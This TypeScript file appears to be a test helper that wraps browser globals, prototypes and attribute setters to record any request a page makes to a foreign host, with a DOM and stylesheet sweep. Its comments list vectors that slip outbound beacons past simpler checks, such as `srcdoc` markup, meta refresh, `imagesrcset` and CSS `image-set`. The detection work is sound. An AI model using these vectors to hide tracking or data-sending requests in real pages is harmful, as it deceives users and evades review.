 * An attribute whose value is a WHOLE DOCUMENT, handed over as text.
 *
 * `srcdoc` is `innerHTML` for a frame: the browser parses it and everything
 * inside it is live. Nothing in it sets a property this file can wrap, and its
 * own name is not a URL, so it went through every net —
 *
 *     iframe.srcdoc = '<img src="' + assembledAtRunTime + '">';
 *
 * — with the address in no literal anywhere. It is read as markup wherever it
 * arrives: through the property, through `setAttribute`, inside other markup,
 * and off the finished page.
 */
const DOCUMENT_ATTRIBUTES: readonly string[] = ["srcdoc"];

/**
 * The one kind of attribute that holds an address nothing ever dereferences.
 *
 * A namespace declaration — `xmlns`, `xmlns:xlink` — NAMES a vocabulary. No
 * agent fetches it, every `<svg>` in these apps carries one, and net one
 * already declares the same URI inert for the same reason. It is exempted by
 * what the attribute IS rather than by which host it names, so
 * `xmlns="https://tracking.example-analytics.net/"` is exempt too — and that is
 * the honest reading: a namespace is not a request whoever wrote it.
 */
const isNamespaceDeclaration = (name: string): boolean =>
  name === "xmlns" || name.startsWith("xmlns:");

/**
 * Is this URL somewhere we control?
 *
 * Relative, same-origin, and the three schemes that never leave the page —
 * `blob:` (an object this code built), `data:` (bytes inline) and `about:`.
 * Everything else is an address, and an address is the finding.
 */
export function reachesElsewhere(raw: unknown, origin: string): boolean {
  const url = String(raw ?? "").trim();
  if (url === "" || url === "#") return false;
  if (/^(blob:|data:|about:)/i.test(url)) return false;
  const hasScheme = /^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(url);
  if (!hasScheme && !url.startsWith("//")) return false; // relative to us
  try {
    return new URL(url, origin).origin !== origin;
  } catch {
    return true; // an address we cannot even parse is not one we control
  }
}

interface Undo {
  (): void;
}

/**
 * Watch the page for anything that would reach a host we do not control.
 *
 * Returns the live list of attempts and a `stop()` that puts every patched
 * global and prototype back. Call `sweep(root)` after a render to catch
 * attributes that arrived some way this did not intercept — `innerHTML`, a
 * hydration, an element built before the watch started.
 */
export function watchEgress(win: Window & typeof globalThis): {
  attempts: EgressAttempt[];
  sweep: (root: ParentNode) => void;
  stop: () => void;
} {
  const attempts: EgressAttempt[] = [];
  const undo: Undo[] = [];
  const origin = win.location?.origin ?? "http://localhost";

  const record = (via: string, url: unknown): void => {
    if (reachesElsewhere(url, origin)) attempts.push({ via, url: String(url) });
  };

  /**
   * EVERY ADDRESS IN A TEXT, minus the ones a caller has already reported.
   *
   * This is net one's `addressesIn` used at run time, and it is what turns the
   * lists below into a backstop rather than the rule. `already` is how the same
   * address avoids being reported twice under two names — a caller passes what
   * it has just recorded, and anything left is something no list knew about.
   */
  const recordAddresses = (via: string, text: string, already: readonly string[]): void => {
    for (const address of addressesIn(text)) {
      if (already.some((value) => value.includes(address) || address.includes(value))) continue;
      record(via, address);
    }
  };

  /**
   * Replace a global with a recorder, whether or not it already exists.
   *
   * TWO SUBTLETIES, BOTH FOUND BY THE MUTANT CASE RATHER THAN BY THINKING:
   *
   *   IT PATCHES EVERY OBJECT THE NAME CAN BE REACHED THROUGH. Under jsdom a
   *   bare `Image` in module code may resolve through `globalThis` while the
   *   page's own code reaches `window`, and the two are not always the same
   *   object. Patching one of them leaves the other open.
   *
   *   AND IT KEEPS THE REAL CONSTRUCTOR WHERE THERE IS ONE. An `Image` that
   *   returned an inert stub would swallow the `img.src = …` that follows,
   *   because the stub has no prototype and so no setter to hook — the beacon
   *   would be recorded once at construction and its ADDRESS never seen. So an
   *   existing global is wrapped and a missing one (`EventSource`, `Worker`,
   *   `RTCPeerConnection` — jsdom has no such thing) is stubbed, which is what
   *   turns a crash about something else into a finding about this.
   */
  const holders = [win as unknown as Record<string, unknown>];
  const global = globalThis as unknown as Record<string, unknown>;
  if (global !== (win as unknown as Record<string, unknown>)) holders.push(global);

  const catchAll = (name: string, via: string, argIndex = 0): void => {
    for (const holder of holders) {
      const had = Object.prototype.hasOwnProperty.call(holder, name);
      const before = holder[name];
      const real = typeof before === "function" ? (before as new (...a: unknown[]) => object) : null;
      const recorder = function (...args: unknown[]): unknown {
        record(via, args[argIndex]);
        if (real !== null) return new real(...args);
        return { close() {}, send() {}, open() {}, addEventListener() {}, terminate() {} };
      };
      try {
        holder[name] = recorder as unknown;
        undo.push(() => {
          if (had) holder[name] = before;
          else delete holder[name];
        });
      } catch {
        /* a non-writable global; the prototype patches below still apply */
      }
    }
  };

  for (const [name, via, index] of [
    ["fetch", "fetch()", 0],
    ["WebSocket", "new WebSocket()", 0],
    ["EventSource", "new EventSource()", 0],
    ["Image", "new Image()", 0],
    ["Audio", "new Audio()", 0],
    ["Worker", "new Worker()", 0],
    ["SharedWorker", "new SharedWorker()", 0],
    ["RTCPeerConnection", "new RTCPeerConnection()", 0],
    ["FontFace", "new FontFace()", 1],
    ["importScripts", "importScripts()", 0],
  ] as const) {
    /*
     * Construction is hooked as well as the `src` setter below, and only ONE of
     * the two ever has the address: `new Image()` takes a width and a height,
     * so a beacon's URL arrives at `img.src` and is recorded there, while
     * `new Audio(url)`, `new Worker(url)` and `new EventSource(url)` are handed
     * theirs outright. Recording nothing when there is nothing to record is the
     * point — a watcher that reported every construction would be noise.
     */
    catchAll(name, via, index);
  }

  /**
   * A NAVIGATION, WHICH FETCHES A WHOLE DOCUMENT AND WAS NOT WATCHED AT ALL.
   *
   * `window.open("https://tracker/…")` reaches the network without touching a
   * request-issuing global or a URL-bearing property, which is exactly why it
   * was one of the three that got past. It is a CALL rather than a
   * construction, so it cannot go through `catchAll` — `new (window.open)()` is
   * not what the page does.
   *
   * The real one is deliberately NOT called through to. A test that really
   * navigated would tear down the page the tour is in the middle of reading,
   * and jsdom's answer to either is a console error about something not being
   * implemented — which is how a finding turns into noise somebody scrolls past.
   */
  const catchCall = (name: string, via: string, argIndex = 0): void => {
    for (const holder of holders) {
      const before = holder[name];
      if (typeof before !== "function") continue;
      try {
        holder[name] = function (...args: unknown[]): unknown {
          record(via, args[argIndex]);
          return null;
        } as unknown;
        undo.push(() => {
          holder[name] = before;
        });
      } catch {
        /* a non-writable global */
      }
    }
  };
  catchCall("open", "window.open()", 0);

  /*
   * ── `location` CANNOT BE WATCHED AT ALL, AND THIS IS WHERE THAT IS SAID ───
   *
   * `location.assign(…)`, `location.replace(…)` and `location.href = …` are
   * navigations exactly as `window.open` is, and not one of them can be
   * wrapped. `Location` is [Unforgeable] in the standard: its members are OWN,
   * non-configurable properties of the instance, there is no prototype to
   * patch, assigning over them fails, and `defineProperty` throws. This was
   * tried — the attempt is what proved it, with jsdom quietly performing the
   * real navigation while the recorder sat unused — so the dead code is gone
   * and the gap is stated instead.
   *
   * IT IS COVERED BY NET TWO INSTEAD. `SENDERS` bans the three spellings
   * outright, over `src/` in every repo: they are navigation APIs, a demo has
   * no use for one, and their presence is the defect whatever address they are
   * handed. That is a weaker guarantee than watching the value — an alias would
   * escape it — and it is the strongest one available here, which is worth
   * knowing rather than assuming.
   */

  const nav = win.navigator as unknown as Record<string, unknown> | undefined;
  if (nav !== undefined) {
    const beacon = nav["sendBeacon"];
    nav["sendBeacon"] = function (url: unknown): boolean {
      record("navigator.sendBeacon()", url);
      return true;
    };
    undo.push(() => {
      if (beacon === undefined) delete nav["sendBeacon"];
      else nav["sendBeacon"] = beacon;
    });
  }

  const xhr = (win as unknown as { XMLHttpRequest?: { prototype: Record<string, unknown> } })
    .XMLHttpRequest;
  if (xhr !== undefined) {
    const open = xhr.prototype["open"];
    xhr.prototype["open"] = function (this: unknown, ...args: unknown[]): unknown {
      record("XMLHttpRequest.open()", args[1]);
      return undefined;
    };
    undo.push(() => {
      xhr.prototype["open"] = open;
    });
  }

  /**
   * CSS THE BROWSER GOES AND RESOLVES.
   *
   * `background-image`, `@import`, `cursor`, `@font-face src`, `mask-image`,
   * `list-style-image` — every one of them is a fetch the page never asks for
   * in JavaScript. Reading `url(…)` and `@import` covers all of them at once,
   * which is the point: this is one rule about a syntax rather than a list of
   * the properties somebody thought of.
   */
  const scanCss = (via: string, css: unknown, already: readonly string[] = []): void => {
    const text = String(css ?? "");
    if (text === "") return;
    const found: string[] = [...already];
    for (const [, url] of text.matchAll(/url\(\s*['"]?([^'")]+)/gi)) {
      found.push(String(url));
      record(`${via} url()`, url);
    }
    for (const [, url] of text.matchAll(/@import\s+(?:url\(\s*)?['"]([^'"]+)/gi)) {
      found.push(String(url));
      record(`${via} @import`, url);
    }
    /*
     * AND ANY OTHER ADDRESS IN THE SAME TEXT, because `url()` and `@import` are
     * two spellings out of several and the two this file happened to know.
     * `background-image: image-set("https://…" 1x)` is a fetch with neither of
     * them in it, and so is a `src: local(…), "https://…"` inside `@font-face`.
     * A stylesheet in these apps names no foreign host for any reason, so the
     * rule is the address rather than the function that holds it.
     */
    recordAddresses(`${via} address in CSS`, text, found);
  };

  /**
   * MARKUP HANDED OVER AS A STRING, which builds elements through the parser
   * and therefore through none of the setters wrapped below.
   *
   * The attribute names it looks for are `URL_ATTRIBUTES` — the same list the
   * DOM sweep uses, so a door added to one is added to both — and the value is
   * then judged by `record` exactly as an assignment would be.
   */
  const scanMarkup = (via: string, markup: unknown): void => {
    const text = String(markup ?? "");
    if (text === "") return;
    const found: string[] = [];
    for (const [, name, value] of text.matchAll(/([\w:-]+)\s*=\s*["']([^"']*)["']/g)) {
      const attribute = (name ?? "").toLowerCase();
      if (URL_ATTRIBUTES.includes(attribute)) {
        found.push(String(value));
        record(`${via} <… ${attribute}>`, value);
      } else if (isNamespaceDeclaration(attribute)) {
        // `<svg xmlns="http://www.w3.org/2000/svg">` is in every icon these
        // apps draw. Counted as seen so the address scan below lets it past —
        // the same exemption `scanAttribute` makes, for the same reason, and it
        // has to be made in both or markup and the page disagree.
        found.push(String(value));
      }
    }
    /*
     * `scanCss` finishes the job for everything the loop above cannot name: an
     * address in an attribute nobody listed, a `style=` on an inner element, a
     * nested `srcdoc` whose own quoting this crude attribute regex will not
     * parse. Whatever it is, if a foreign address is in markup this page is
     * building from a string, it is reported.
     */
    scanCss(via, text, found);
  };

  /**
   * ONE ATTRIBUTE, JUDGED BY WHAT KIND OF ATTRIBUTE IT IS.
   *
   * ── ADDRESS IN ANY ATTRIBUTE ───────────────────────────────────────────────
   *
   * Used at both doors an attribute can arrive through — `setAttribute` and the
   * finished page — so the two can never diverge, which they had:
   *
   *   1. a URL attribute (`URL_ATTRIBUTES`) is the value, judged;
   *   2. `style` is CSS;
   *   3. `srcdoc` is a document;
   *   4. a namespace declaration is a name, and is let through;
   *   5. ANYTHING ELSE is scanned for an address, and an address in it is a
   *      finding.
   *
   * Rule 5 is the one that matters and it is why this is not a fourth list.
   * Two more vectors passed all three nets with the first four rules in place:
   *
   *     <meta http-equiv="refresh" content="0;url=…">        a NAVIGATION
   *     <link rel="preload" as="image" imagesrcset="… 1x">   a FETCH
   *
   * Neither attribute is a URL attribute, both are addresses the browser acts
   * on, and adding the two names to a list would have left the sixth, seventh
   * and eighth. These apps put no foreign address in any attribute for any
   * reason, so the presence of one is the finding whatever the attribute is
   * called — which is the same shape as net one, applied to the live page.
   */
  const scanAttribute = (
    /** How this door names the attribute, so a finding says where it was. */
    via: (attribute: string) => string,
    rawName: unknown,
    value: unknown,
  ): void => {
    const name = String(rawName ?? "").toLowerCase();
    if (URL_ATTRIBUTES.includes(name)) record(via(name), value);
    else if (name === "style") scanCss(via("style"), value);
    else if (DOCUMENT_ATTRIBUTES.includes(name)) scanMarkup(via(name), value);
    else if (isNamespaceDeclaration(name)) return;
    else recordAddresses(`${via(name)} address`, String(value ?? ""), []);
  };

  /** Wrap a setter on a prototype, reading the value with `read`. */
  const watchSetter = (
    ctorName: string,
    prop: string,
    read: (value: unknown, self: unknown) => void,
  ): void => {
    const ctor = (win as unknown as Record<string, { prototype: object } | undefined>)[ctorName];
    if (ctor === undefined) return;
    const descriptor = Object.getOwnPropertyDescriptor(ctor.prototype, prop);
    if (descriptor?.set === undefined) return;
    const set = descriptor.set;
    Object.defineProperty(ctor.prototype, prop, {
      ...descriptor,
      set(this: unknown, value: unknown) {
        read(value, this);
        set.call(this, value);
      },
    });
    undo.push(() => {
      Object.defineProperty(ctor.prototype, prop, descriptor);
    });
  };

  /** Wrap a method on a prototype, reading one argument. */
  const watchMethod = (
    ctorName: string,
    method: string,
    read: (value: unknown) => void,
    argIndex = 0,
  ): void => {
    const ctor = (win as unknown as Record<string, { prototype: Record<string, unknown> } | undefined>)[
      ctorName
    ];
    if (ctor === undefined) return;
    const before = ctor.prototype[method];
    if (typeof before !== "function") return;
    ctor.prototype[method] = function (this: unknown, ...args: unknown[]): unknown {
      read(args[argIndex]);
      return (before as (...a: unknown[]) => unknown).apply(this, args);
    };
    undo.push(() => {
      ctor.prototype[method] = before;
    });
  };

  for (const [ctorName, prop] of [
    ["Element", "innerHTML"],
    ["Element", "outerHTML"],
    ["ShadowRoot", "innerHTML"],
    /*
     * A FRAME'S WHOLE DOCUMENT, AS A STRING. `srcdoc` is `innerHTML` with a
     * `<html>` around it, and it was the vector that got past everything: the
     * parser sets no property here, the attribute is not a URL, and the address
     * inside it was assembled at run time. It is markup, so it is read as
     * markup — through the property here, through `setAttribute` and off the
     * page in `scanAttribute`.
     */
    ["HTMLIFrameElement", "srcdoc"],
  ] as const) {
    watchSetter(ctorName, prop, (value) => scanMarkup(`${ctorName}.${prop}`, value));
  }
  for (const [ctorName, method, index] of [
    ["Element", "insertAdjacentHTML", 1],
    ["Document", "write", 0],
    ["Document", "writeln", 0],
    ["Range", "createContextualFragment", 0],
    ["DOMParser", "parseFromString", 0],
    /*
     * The modern spellings of the same door. `watchMethod` is a no-op where the
     * environment has no such method — jsdom has neither today — so these cost
     * nothing and are here because a test environment that grows them must not
     * grow a hole with them.
     */
    ["Element", "setHTMLUnsafe", 0],
    ["ShadowRoot", "setHTMLUnsafe", 0],
  ] as const) {
    watchMethod(ctorName, method, (value) => scanMarkup(`${ctorName}.${method}()`, value), index);
  }

  /* And the same for CSS, at every door it can arrive through. */
  watchSetter("CSSStyleDeclaration", "cssText", (value) => scanCss("style.cssText", value));
  watchMethod("CSSStyleDeclaration", "setProperty", (value) => scanCss("style.setProperty()", value), 1);
  watchMethod("CSSStyleSheet", "insertRule", (value) => scanCss("sheet.insertRule()", value), 0);
  watchMethod("CSSStyleSheet", "replaceSync", (value) => scanCss("sheet.replaceSync()", value), 0);
  watchMethod("CSSStyleSheet", "replace", (value) => scanCss("sheet.replace()", value), 0);
  /*
   * A `<style>` is filled by writing TEXT into it, which is a `Node` operation
   * and not a `CSSStyleDeclaration` one. Narrowed to style elements so that
   * wrapping the setter every React text update goes through costs one
   * `tagName` read rather than a regex.
   */
  watchSetter("Node", "textContent", (value, self) => {
    const el = self as { tagName?: unknown };
    if (typeof el?.tagName === "string" && el.tagName.toUpperCase() === "STYLE") {
      scanCss("<style>.textContent", value);
    }
  });

  /* Every URL-bearing property, on every element prototype that has one. */
  const prototypes: [string, string][] = [
    ["HTMLImageElement", "src"],
    ["HTMLImageElement", "srcset"],
    ["HTMLScriptElement", "src"],
    ["HTMLLinkElement", "href"],
    ["HTMLIFrameElement", "src"],
    ["HTMLFrameElement", "src"],
    ["HTMLMediaElement", "src"],
    ["HTMLSourceElement", "src"],
    ["HTMLSourceElement", "srcset"],
    ["HTMLTrackElement", "src"],
    ["HTMLVideoElement", "poster"],
    ["HTMLObjectElement", "data"],
    ["HTMLEmbedElement", "src"],
    ["HTMLFormElement", "action"],
    ["HTMLAnchorElement", "href"],
    ["HTMLAreaElement", "href"],
    ["HTMLBaseElement", "href"],
  ];
  for (const [ctorName, prop] of prototypes) {
    const ctor = (win as unknown as Record<string, { prototype: object } | undefined>)[ctorName];
    if (ctor === undefined) continue;
    const descriptor = Object.getOwnPropertyDescriptor(ctor.prototype, prop);
    if (descriptor?.set === undefined) continue;
    const set = descriptor.set;
    Object.defineProperty(ctor.prototype, prop, {
      ...descriptor,
      set(this: unknown, value: unknown) {
        record(`${ctorName}.${prop}`, value);
        set.call(this, value);
      },
    });
    undo.push(() => {
      Object.defineProperty(ctor.prototype, prop, descriptor);
    });
  }

  /* And the attribute doors, which is how React and `innerHTML` set most of it. */
  const element = (win as unknown as { Element?: { prototype: Record<string, unknown> } }).Element;
  if (element !== undefined) {
    for (const method of ["setAttribute", "setAttributeNS"] as const) {
      const before = element.prototype[method];
      if (typeof before !== "function") continue;
      const nameIndex = method === "setAttribute" ? 0 : 1;
      element.prototype[method] = function (this: unknown, ...args: unknown[]): unknown {
        // Every kind of attribute, by the one rule — `style` is CSS, `srcdoc`
        // is a document, and an address in any other attribute is a finding.
        scanAttribute((name) => `${method}(${name})`, args[nameIndex], args[nameIndex + 1]);
        return (before as (...a: unknown[]) => unknown).apply(this, args);
      };
      undo.push(() => {
        element.prototype[method] = before;
      });
    }
  }

  /**
   * The finished page, read for addresses nothing above intercepted.
   *
   * ── IT SWEEPS THE DOCUMENT, NOT ONLY WHAT IT WAS HANDED ───────────────────
   *
   * The caller passes the element the tour mounted, and that is the wrong
   * boundary for the question being asked. `document.body.appendChild(img)` and
   * `document.head.appendChild(style)` both put a live request OUTSIDE the
   * mounted tree, which is how an `<img>` parsed out of `innerHTML` reached the
   * network with 36 D11 cases green. The page is the unit, so the page is what
   * is read — the passed root as well, since a detached fragment a caller wants
   * looked at is not in the document yet.
   *
   * Each element is read once however many roots reach it.
   */
  const sweep = (root: ParentNode): void => {
    const seen = new Set<Element>();
    const roots: ParentNode[] = [root];
    const page = win.document as unknown as ParentNode | undefined;
    if (page !== undefined && page !== root) roots.push(page);

    for (const scope of roots) {
      for (const el of scope.querySelectorAll("*")) {
        if (seen.has(el)) continue;
        seen.add(el);
        const tag = el.tagName.toLowerCase();
        for (const attr of el.attributes) {
          // The same rule the `setAttribute` door uses, so an attribute that
          // arrives some way this file never wrapped is read identically.
          scanAttribute((name) => `<${tag} ${name}>`, attr.name, attr.value);
        }
        // The text of a `<style>`, read raw. Going through `cssRules` instead
        // would mean trusting the test environment's CSS parser to have kept
        // the declaration — jsdom drops what it cannot parse, silently, which
        // is the one thing a detector must never do.
        if (tag === "style") scanCss("<style>", el.textContent ?? "");
      }
    }

    /*
     * Stylesheets with no `<style>` of their own: a constructed
     * `CSSStyleSheet` in `adoptedStyleSheets` is a real sheet, applies to the
     * real page, and appears nowhere in the tree above.
     */
    const adopted = (win.document as unknown as { adoptedStyleSheets?: unknown })
      .adoptedStyleSheets;
    if (Array.isArray(adopted)) {
      for (const sheet of adopted as { cssRules?: ArrayLike<{ cssText?: string }> }[]) {
        try {
          const rules = sheet.cssRules ?? [];
          for (let i = 0; i < rules.length; i += 1) scanCss("adoptedStyleSheets", rules[i]?.cssText);
        } catch {
          /* a sheet we may not read is a sheet we did not install */
        }
      }
    }
  };

  return {
    attempts,
    sweep,
    stop: () => {
      for (const put of undo.reverse()) put();
    },
  };
}
